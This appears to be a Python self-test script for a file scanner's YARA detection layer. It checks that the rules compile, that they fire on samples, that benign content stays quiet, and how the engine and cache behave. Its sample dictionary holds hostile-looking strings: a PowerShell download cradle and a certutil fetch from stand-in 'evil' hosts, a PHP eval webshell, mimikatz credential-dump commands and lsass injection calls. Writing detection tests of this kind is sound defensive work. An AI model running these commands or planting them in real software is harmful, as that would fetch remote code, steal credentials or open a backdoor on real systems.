"""End-to-end verification of the YARA layer.

Proves the things that matter, not just that the module imports:

  1. The bundled rule corpus compiles, and every rule in it is reachable.
  2. Each rule fires on content that should trip it.
  3. The corpus stays quiet on benign content (false-positive control).
  4. The engine escalates a YARA hit to Malicious through the real scan path,
     reading through the locked handle.
  5. A YARA detection short-circuits the cloud layers instead of spending quota.
  6. The verdict survives the cache round-trip (yara_status persists).
  7. A disabled layer reports Skipped and does not change the verdict.

Run:  python tools\\verify_yara.py
"""

from __future__ import annotations

import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from scanner.config import Settings  # noqa: E402
from scanner.database import ScanDatabase  # noqa: E402
from scanner.engine import (  # noqa: E402
    LayerResult,
    ScanEngine,
    Status,
    Verdict,
    aggregate_verdict,
)
from scanner.yara_engine import YaraError, compile_directory, compile_rules  # noqa: E402

PASS = 0
FAIL = 0


def check(label: str, condition: bool, detail: str = "") -> None:
    global PASS, FAIL
    if condition:
        PASS += 1
        print(f"  PASS  {label}")
    else:
        FAIL += 1
        print(f"  FAIL  {label}" + (f"\n        {detail}" if detail else ""))


# --------------------------------------------------------------------------- #
# 1. The corpus compiles
# --------------------------------------------------------------------------- #

print("\nRule corpus")
rules_dir = Path(__file__).resolve().parent.parent / "scanner" / "rules"
try:
    rule_set = compile_directory(rules_dir)
    compiled = True
    error = ""
except (YaraError, OSError) as exc:
    rule_set = None
    compiled = False
    error = str(exc)

check("bundled rules compile", compiled, error)
check("corpus is not empty", rule_set is not None and len(rule_set) > 0,
      f"got {len(rule_set) if rule_set else 0} rules")
if rule_set is not None:
    names = [r.name for r in rule_set]
    check("no duplicate rule names", len(names) == len(set(names)))
    print(f"        loaded {len(rule_set)} rules: {', '.join(sorted(names)[:5])}...")


# --------------------------------------------------------------------------- #
# 2. Every rule fires on content that should trip it
# --------------------------------------------------------------------------- #

print("\nRules fire on hostile content")
# One sample per rule in the corpus. Keyed by rule name so a rule added to the
# corpus without a sample here is reported rather than silently untested.
SAMPLES = {
    "Ransomware_Note_Text":
        b"Your files have been encrypted. To decrypt your files send bitcoin.",
    "Ransomware_Extension_Targeting":
        b".docx .xlsx .pdf .sql .bak CryptEncrypt DeleteFile",
    "Credential_Dumping_Strings":
        b"sekurlsa::logonpasswords privilege::debug",
    "PowerShell_Download_Cradle":
        b"IEX(New-Object Net.WebClient).DownloadString('http://evil.example/a')",
    "Obfuscated_PowerShell":
        b"FromBase64String Invoke-Expression -join",
    "LOLBin_Abuse":
        b"certutil.exe -urlcache -split -f http://evil/a.exe a.exe",
    # The rule needs the call syntax (the parenthesis) as well as the target,
    # because a module that merely *exports* these names is not injecting.
    "Process_Injection_APIs":
        b"OpenProcess(0x1F0FFF, 0, pid); "
        b"VirtualAllocEx(h, 0, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE); "
        b"WriteProcessMemory(h, p, buf, n, &w); "
        b"CreateRemoteThread(h, 0, 0, p, 0, 0, 0); "
        b"target: lsass.exe",
    "Anti_Analysis_Checks":
        b"IsDebuggerPresent VBoxService",
    "Persistence_Registry_Run":
        b"RegSetValue CurrentVersion\\Run -WindowStyle Hidden",
    "Scheduled_Task_Persistence":
        b"schtasks /create /sc minute",
    "Webshell_Indicators":
        b"<?php eval($_POST['cmd']); ?>",
    "Cryptominer_Indicators":
        b"stratum+tcp://pool.example:3333",
    # The blob must be passed *into* the decoder: a quoted 200+ char run.
    "Suspicious_Base64_Blob":
        b"base64_decode('" + b"A" * 1200 + b"')",
    "UPX_Packed":
        b"UPX0UPX1UPX!",
    "Tor_Onion_Reference":
        b"http://abcdefghijklmnop.onion/",
    "Credential_Phishing_Form":
        b"<form action=x method=\"post\"><input type=\"password\">mailto:a@b",
}

if rule_set is not None:
    for rule_name, payload in SAMPLES.items():
        hits = {m.rule for m in rule_set.match(payload, "sample")}
        check(f"{rule_name} fires", rule_name in hits,
              f"matched instead: {sorted(hits) or 'nothing'}")

    untested = [r.name for r in rule_set if r.name not in SAMPLES]
    check("every corpus rule has a sample", not untested,
          f"no sample for: {untested}")


# --------------------------------------------------------------------------- #
# 3. False-positive control
# --------------------------------------------------------------------------- #

print("\nBenign content stays quiet")
BENIGN = {
    "plain text":
        b"Quarterly report. Revenue grew 4% on strong demand in EMEA.",
    "python source":
        b"import os\n\ndef main():\n    print(os.getcwd())\n",
    "html page":
        b"<html><body><h1>Welcome</h1><p>Hello, world.</p></body></html>",
    "json config":
        b'{"name": "app", "version": "1.0.0", "debug": false}',
    "sql":
        b"SELECT id, name FROM users WHERE active = 1 ORDER BY name;",
}
if rule_set is not None:
    for label, payload in BENIGN.items():
        hits = rule_set.match(payload, label)
        check(f"{label} produces no hit", not hits,
              f"false positive: {[h.rule for h in hits]}")


# --------------------------------------------------------------------------- #
# 4. Parser semantics that the corpus depends on
# --------------------------------------------------------------------------- #

print("\nCondition semantics")
CASES = [
    ("2 of them needs two", 'rule A { strings: $a="aa" $b="bb" $c="cc" '
                            'condition: 2 of them }', b"aa", False),
    ("2 of them with two", 'rule A { strings: $a="aa" $b="bb" $c="cc" '
                           'condition: 2 of them }', b"aa bb", True),
    ("wildcard set", 'rule A { strings: $a1="aa" $a2="bb" $b="zz" '
                     'condition: 1 of ($a*) }', b"bb", True),
    ("$a at 0 anchored", 'rule A { strings: $m={4D 5A} condition: $m at 0 }',
     b"MZ\x00\x00", True),
    ("$a at 0 rejects offset", 'rule A { strings: $m={4D 5A} condition: $m at 0 }',
     b"XXMZ", False),
    ("match count", 'rule A { strings: $a="aa" condition: #a > 1 }',
     b"aa aa", True),
    ("match count too low", 'rule A { strings: $a="aa" condition: #a > 1 }',
     b"aa", False),
    ("filesize bound", 'rule A { strings: $a="aa" condition: $a and filesize < 1KB }',
     b"aa", True),
    ("hex wildcard", 'rule A { strings: $m={ 4D 5A ?? 00 } condition: $m }',
     b"MZ\xff\x00", True),
    ("nocase", 'rule A { strings: $a="Hello" nocase condition: $a }',
     b"hELLo", True),
    ("wide", 'rule A { strings: $a="Hi" wide condition: $a }',
     b"H\x00i\x00", True),
]
for label, source, payload, expected in CASES:
    try:
        got = bool(compile_rules(source).match(payload, "x"))
        check(label, got == expected, f"expected {expected}, got {got}")
    except YaraError as exc:
        check(label, False, f"compile error: {exc}")

# Unsupported constructs must fail loudly, never silently never-fire.
for label, source in [
    ("pe module rejected", 'rule A { condition: pe.entry_point == 0 }'),
    ("xor modifier rejected", 'rule A { strings: $a="x" xor condition: $a }'),
]:
    try:
        compile_rules(source)
        check(label, False, "compiled when it should have raised")
    except YaraError:
        check(label, True)


# --------------------------------------------------------------------------- #
# 5. Engine integration, through the real scan path
# --------------------------------------------------------------------------- #

print("\nEngine integration")
tmp = Path(tempfile.mkdtemp(prefix="hs_yara_"))
db = ScanDatabase(tmp / "test.db")
settings = Settings(tmp / "settings.json")
settings.set("auto_quarantine", False)
settings.set("cache_ttl_hours", 24)

engine = ScanEngine(settings, db)

hostile = tmp / "note.txt"
hostile.write_bytes(
    b"Your files have been encrypted. To decrypt your files send bitcoin."
)
result = engine.scan_file(hostile, source="test", use_cache=False)

check("YARA layer reports Malicious", result.yara.status is Status.MALICIOUS,
      f"got {result.yara.status.value}: {result.yara.detail}")
check("YARA hit names the rule", "Ransomware_Note_Text" in result.yara.detail,
      result.yara.detail)
check("overall verdict is Malicious", result.verdict is Verdict.MALICIOUS,
      f"got {result.verdict.value}")
check("cloud layers skipped on YARA hit",
      result.malwarebazaar.status is Status.SKIPPED
      and result.opswat.status is Status.SKIPPED,
      f"mb={result.malwarebazaar.status.value} op={result.opswat.status.value}")
check("raw evidence records the match",
      bool(result.yara.raw.get("matches")),
      str(result.yara.raw)[:200])

clean = tmp / "readme.txt"
clean.write_bytes(b"A short note about the garden and the weather.")
clean_result = engine.scan_file(clean, source="test", use_cache=False)
check("clean file passes YARA", clean_result.yara.status is Status.CLEAN,
      f"got {clean_result.yara.status.value}: {clean_result.yara.detail}")
check("clean file is not Malicious", clean_result.verdict is not Verdict.MALICIOUS,
      f"got {clean_result.verdict.value}")

# Cache round-trip: yara_status must survive the database.
cached = db.get_cached(result.sha256, ttl_hours=24)
check("cached row exists", cached is not None)
if cached is not None:
    check("yara_status persists in cache", cached.yara_status == "Malicious",
          f"got {cached.yara_status!r}")
    check("cached details keep YARA evidence",
          bool((cached.details or {}).get("yara")),
          str(cached.details)[:200])

# A second scan must be served from cache and still say Malicious.
again = engine.scan_file(hostile, source="test", use_cache=True)
check("rescan served from cache", again.from_cache)
check("cached verdict still Malicious", again.verdict is Verdict.MALICIOUS,
      f"got {again.verdict.value}")
check("cached yara status restored",
      again.yara.status is Status.MALICIOUS, again.yara.status.value)

# Disabling the layer must degrade to Skipped, not crash or lie.
settings.set("yara_enabled", False)
disabled_engine = ScanEngine(settings, ScanDatabase(tmp / "test2.db"))
disabled = disabled_engine.scan_file(clean, source="test", use_cache=False)
check("disabled layer reports Skipped", disabled.yara.status is Status.SKIPPED,
      disabled.yara.status.value)
check("disabled layer does not claim Malicious",
      disabled.verdict is not Verdict.MALICIOUS, disabled.verdict.value)
settings.set("yara_enabled", True)


# --------------------------------------------------------------------------- #
# 6. Aggregation contract
# --------------------------------------------------------------------------- #

print("\nAggregation")
clean_l = LayerResult(status=Status.CLEAN)
skip_l = LayerResult(status=Status.SKIPPED)
mal_l = LayerResult(status=Status.MALICIOUS)
susp_l = LayerResult(status=Status.SUSPICIOUS)

v, _ = aggregate_verdict(clean_l, skip_l, skip_l, None, None, mal_l)
check("YARA malicious wins over clean Defender", v is Verdict.MALICIOUS, v.value)

v, _ = aggregate_verdict(clean_l, skip_l, skip_l, None, None, susp_l)
check("YARA suspicious escalates to Suspicious", v is Verdict.SUSPICIOUS, v.value)

v, _ = aggregate_verdict(clean_l, skip_l, skip_l, None, None, clean_l)
check("YARA clean leaves a clean verdict", v is Verdict.CLEAN, v.value)

v, _ = aggregate_verdict(clean_l, skip_l, skip_l, None, None, None)
check("absent YARA layer is tolerated", v is Verdict.CLEAN, v.value)


# --------------------------------------------------------------------------- #
# Summary
# --------------------------------------------------------------------------- #

print("\n" + "=" * 60)
print(f"PASSED: {PASS}   FAILED: {FAIL}")
print("=" * 60)
sys.exit(0 if FAIL == 0 else 1)
